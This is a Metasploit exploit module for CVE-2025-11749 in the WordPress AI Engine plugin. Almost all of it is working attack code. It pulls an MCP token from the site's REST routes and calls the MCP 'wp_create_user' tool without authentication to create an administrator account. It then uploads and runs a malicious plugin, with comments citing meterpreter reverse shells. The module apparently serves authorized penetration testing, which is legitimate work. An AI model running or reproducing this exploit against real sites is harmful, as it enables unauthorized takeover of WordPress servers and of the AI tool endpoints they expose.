##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Payload::Php
  include Msf::Exploit::FileDropper
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress

  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'WordPress AI Engine Plugin MCP Unauthenticated Admin Creation to RCE',
        'Description' => %q{
          This module exploits an unauthenticated vulnerability in the WordPress AI Engine plugin
          (versions <= 3.1.3). The vulnerability allows an attacker to create an administrator account
          via the MCP (Model Context Protocol) endpoint without authentication. The module supports
          both `/wp-json/mcp/v1/` and `/?rest_route=/mcp/v1/` endpoints. Once an administrator
          account is created, the module uploads and executes a malicious plugin to achieve remote
          code execution (RCE).
        },
        'Author' => [
          'Emiliano Versini',                           # Vulnerability discovery
          'Khaled Alenazi (Nxploited)',                 # PoC
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2025-11749'],
          ['URL', 'https://github.com/Nxploited/CVE-2025-11749']
        ],
        'Platform' => %w[php unix linux win],
        'Arch' => [ARCH_PHP, ARCH_CMD],
        'DisclosureDate' => '2025-11-04',
        'DefaultTarget' => 0,
        'Privileged' => false,
        'Targets' => [
          [
            'PHP In-Memory',
            {
              'Platform' => 'php',
              'Arch' => ARCH_PHP
              # tested with php/meterpreter/reverse_tcp
            }
          ],
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
              # tested with cmd/linux/http/x64/meterpreter/reverse_tcp
            }
          ],
          [
            'Windows Command Shell',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
              # tested with cmd/windows/http/x64/meterpreter/reverse_tcp
            }
          ]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
    )

    register_options(
      [
        OptString.new('USERNAME', [true, 'Username to create', Faker::Internet.username]),
        OptString.new('PASSWORD', [true, 'Password for the new user', Faker::Internet.password(min_length: 8)]),
        OptString.new('EMAIL', [true, 'Email for the new user', Faker::Internet.email])
      ]
    )
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    plugin_check = check_plugin_version_from_readme('ai-engine', '3.1.4')
    return plugin_check if plugin_check.code == 'appears' || plugin_check.code == 'safe'

    token = find_token
    return CheckCode::Safe('MCP token not found. Plugin may be patched or not configured.') unless token

    CheckCode::Vulnerable
  end

  def exploit
    fail_with(Failure::NotFound, 'The target does not appear to be using WordPress') unless wordpress_and_online?

    token = find_token
    fail_with(Failure::NotVulnerable, 'MCP token not found. Plugin may be patched or not configured.') unless token

    username = datastore['USERNAME']
    password = datastore['PASSWORD']
    email = datastore['EMAIL']

    unless create_admin_user(token, username, password, email)
      fail_with(Failure::UnexpectedReply, 'Failed to create administrator account.')
    end

    admin_cookie = wordpress_login(username, password)
    fail_with(Failure::UnexpectedReply, 'Failed to log in to WordPress admin.') unless admin_cookie

    upload_and_execute_payload(admin_cookie)
  end

  def send_rest_request(rest_path, method: 'GET', data: nil)
    opts = {
      'method' => method,
      'ctype' => method == 'POST' ? 'application/json' : nil,
      'data' => data
    }

    res = send_request_cgi(opts.merge('uri' => normalize_uri(target_uri.path, 'wp-json', rest_path)))
    return res if res&.code == 200

    send_request_cgi(opts.merge('uri' => normalize_uri(target_uri.path), 'vars_get' => { 'rest_route' => rest_path }))
  end

  def find_token
    extract_token_from_routes(send_rest_request('/'))
  end

  def extract_token_from_routes(res)
    return nil unless res&.code == 200

    routes = res.get_json_document&.dig('routes')
    return nil unless routes.is_a?(Hash)

    mcp_regex = %r{^/mcp/v1/([^/]+)/sse$}
    routes.each_key do |route|
      next unless route.is_a?(String)

      match = route.match(mcp_regex)
      return match[1] if match && match[1] != 'sse' && !match[1].empty?
    end
    nil
  end

  def send_mcp_request(token, segments, method: 'GET', data: nil)
    send_rest_request("/mcp/v1/#{token}/#{segments.join('/')}", method: method, data: data)
  end

  def create_admin_user(token, username, password, email)
    payload = {
      'jsonrpc' => '2.0',
      'id' => rand(1..999_999),
      'method' => 'tools/call',
      'params' => {
        'name' => 'wp_create_user',
        'arguments' => {
          'user_login' => username,
          'user_email' => email,
          'user_pass' => password,
          'role' => 'administrator'
        }
      }
    }.to_json

    res = send_mcp_request(token, ['sse'], method: 'POST', data: payload)
    return false unless res
    return true if res.code == 204
    return false unless res.code == 200

    res.body =~ /User created|success|created/i
  end

  def upload_and_execute_payload(admin_cookie)
    plugin_name = "wp_#{Rex::Text.rand_text_alphanumeric(5).downcase}"
    payload_name = "ajax_#{Rex::Text.rand_text_alphanumeric(5).downcase}"

    zip = generate_plugin(plugin_name, payload_name)
    fail_with(Failure::UnexpectedReply, 'Failed to upload the payload') unless wordpress_upload_plugin(plugin_name, zip.pack, admin_cookie)

    register_files_for_cleanup("#{payload_name}.php", "#{plugin_name}.php")
    register_dir_for_cleanup("../#{plugin_name}")
    payload_uri = normalize_uri(wordpress_url_plugins, plugin_name, "#{payload_name}.php")
    send_request_cgi('uri' => payload_uri, 'method' => 'GET')
  end
end
